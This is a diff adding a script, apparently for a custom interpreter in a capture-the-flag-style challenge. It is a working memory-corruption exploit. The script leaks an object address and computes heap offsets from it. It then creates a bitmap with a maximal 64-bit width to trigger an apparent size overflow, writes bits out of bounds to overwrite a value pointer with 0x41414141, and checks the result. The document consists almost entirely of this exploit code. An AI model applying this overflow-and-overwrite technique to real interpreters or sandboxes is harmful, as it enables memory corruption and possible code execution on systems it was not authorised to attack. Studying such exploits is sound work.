@@ -1,0 +1,113 @@
+print("=== Correct Bitmap Write Implementation ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapdataptr = targetaddr - 8192;
+print("Calculated addresses:");
+print("value_ptr_addr:");
+print(valueptraddr);
+print("bitmap_data_ptr:");
+print(bitmapdataptr);
+
+print("Creating bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Calculating bit_index:");
+int offset = valueptraddr - bitmapdataptr;
+print("offset:");
+print(offset);
+int bitindex = offset * 8;
+print("bit_index:");
+print(bitindex);
+
+print("Writing test value 0x41414141 (1094795585)");
+print("Starting at bit_index = 59712");
+print("x coordinate = 59712, y = 0");
+print("Bit position within byte = 59712 % 8 = 0");
+
+print("Writing 0x41 (01000001) - first byte");
+set(b1, 59712, 0, 0);
+set(b1, 59713, 0, 1);
+set(b1, 59714, 0, 0);
+set(b1, 59715, 0, 0);
+set(b1, 59716, 0, 0);
+set(b1, 59717, 0, 0);
+set(b1, 59718, 0, 0);
+set(b1, 59719, 0, 1);
+
+print("Writing 0x41 (01000001) - second byte");
+set(b1, 59720, 0, 0);
+set(b1, 59721, 0, 1);
+set(b1, 59722, 0, 0);
+set(b1, 59723, 0, 0);
+set(b1, 59724, 0, 0);
+set(b1, 59725, 0, 0);
+set(b1, 59726, 0, 0);
+set(b1, 59727, 0, 1);
+
+print("Writing 0x41 (01000001) - third byte");
+set(b1, 59728, 0, 0);
+set(b1, 59729, 0, 1);
+set(b1, 59730, 0, 0);
+set(b1, 59731, 0, 0);
+set(b1, 59732, 0, 0);
+set(b1, 59733, 0, 0);
+set(b1, 59734, 0, 0);
+set(b1, 59735, 0, 1);
+
+print("Writing 0x41 (01000001) - fourth byte");
+set(b1, 59736, 0, 0);
+set(b1, 59737, 0, 1);
+set(b1, 59738, 0, 0);
+set(b1, 59739, 0, 0);
+set(b1, 59740, 0, 0);
+set(b1, 59741, 0, 0);
+set(b1, 59742, 0, 0);
+set(b1, 59743, 0, 1);
+
+print("Writing zeros for remaining 4 bytes (64-bit total)");
+set(b1, 59744, 0, 0);
+set(b1, 59745, 0, 0);
+set(b1, 59746, 0, 0);
+set(b1, 59747, 0, 0);
+set(b1, 59748, 0, 0);
+set(b1, 59749, 0, 0);
+set(b1, 59750, 0, 0);
+set(b1, 59751, 0, 0);
+set(b1, 59752, 0, 0);
+set(b1, 59753, 0, 0);
+set(b1, 59754, 0, 0);
+set(b1, 59755, 0, 0);
+set(b1, 59756, 0, 0);
+set(b1, 59757, 0, 0);
+set(b1, 59758, 0, 0);
+set(b1, 59759, 0, 0);
+set(b1, 59760, 0, 0);
+set(b1, 59761, 0, 0);
+set(b1, 59762, 0, 0);
+set(b1, 59763, 0, 0);
+set(b1, 59764, 0, 0);
+set(b1, 59765, 0, 0);
+set(b1, 59766, 0, 0);
+set(b1, 59767, 0, 0);
+set(b1, 59768, 0, 0);
+set(b1, 59769, 0, 0);
+set(b1, 59770, 0, 0);
+set(b1, 59771, 0, 0);
+set(b1, 59772, 0, 0);
+set(b1, 59773, 0, 0);
+set(b1, 59774, 0, 0);
+set(b1, 59775, 0, 0);
+
+print("Wrote 64 bits (0x0000000041414141)");
+print("Now verify:");
+print("int test = target;");
+print("print(test);");
+print("If test == 1094795585 (0x41414141), addresses are correct!");
+
